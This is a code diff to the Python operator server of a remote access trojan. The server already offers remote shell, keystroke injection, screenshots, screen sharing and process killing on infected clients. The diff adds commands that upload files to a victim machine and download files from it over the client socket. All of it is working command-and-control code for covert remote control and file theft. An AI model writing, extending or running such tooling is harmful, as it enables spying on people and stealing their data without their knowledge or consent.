@@ -1,9 +1,10 @@
 import sys
 import time
 import socket
+import os
 import colorama # type: ignore
 from colorama import Fore, Style # type: ignore
-from modules.rat_server_utils import clear_screen, handle_client_disconnect, receive_screenshot, receive_screen_share, show_client_commands
+from modules.rat_server_utils import clear_screen, handle_client_disconnect, receive_screenshot, receive_screen_share, show_client_commands, upload_file, download_file
 from modules.server_ui_utils import print_banner
 from modules.server_formatings import (
     format_network_info, 
@@ -32,7 +33,7 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
         "back", "help", "clear", "kill", "exit", "screenshot", "sysinfo", "netinfo", 
         "list_processes", "search_process", "terminate_process", "send_keys", 
         "system_logs", "installed_software", "launch_app", "shell", 
-        "start_screen_share", "stop_screen_share"
+        "start_screen_share", "stop_screen_share", "upload_file", "download_file"
     ]
     
     # Function to check if a command is valid
@@ -52,6 +53,9 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
                 return True
             # Check for system_logs with parameters
             if valid_cmd == "system_logs" and base_cmd == "system_logs":
+                return True
+            # Check for file transfer commands with parameters
+            if valid_cmd in ["upload_file", "download_file"] and base_cmd == valid_cmd:
                 return True
         
         return False
@@ -226,6 +230,50 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
                     active_client = handle_client_disconnect_wrapper_local(active_client)
                     input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                     break
+                    
+            elif command.lower().startswith("upload_file "):
+                try:
+                    # Extract file path from command
+                    file_path = command[11:].strip()
+                    
+                    # Check if file exists
+                    if not os.path.exists(file_path):
+                        print(f"{Fore.RED}Error: File not found: {file_path}{Style.RESET_ALL}")
+                        continue
+                    
+                    # Upload the file to client
+                    success = upload_file(client_sockets[active_client], file_path, buffer_size)
+                    
+                    if not success:
+                        print(f"{Fore.RED}Failed to upload file{Style.RESET_ALL}")
+                        
+                except Exception as e:
+                    print(f"{Fore.RED}Error uploading file: {str(e)}{Style.RESET_ALL}")
+                    
+            elif command.lower().startswith("download_file "):
+                try:
+                    # Extract file path from command
+                    remote_path = command[13:].strip()
+                    print(f"{Fore.CYAN}Attempting to download: {remote_path}{Style.RESET_ALL}")
+                    
+                    # Set a longer timeout for file transfers
+                    client_sockets[active_client].settimeout(60.0)  # 60 second timeout
+                    
+                    # Download the file from client
+                    local_path = download_file(client_sockets[active_client], remote_path, None, buffer_size)
+                    
+                    # Reset timeout
+                    client_sockets[active_client].settimeout(None)
+                    
+                    if not local_path:
+                        print(f"{Fore.RED}Failed to download file{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.GREEN}File downloaded successfully to: {local_path}{Style.RESET_ALL}")
+                        
+                except Exception as e:
+                    print(f"{Fore.RED}Error downloading file: {str(e)}{Style.RESET_ALL}")
+                    # Reset timeout on error
+                    client_sockets[active_client].settimeout(None)
             
             elif command.lower() == "sysinfo":
                 try:
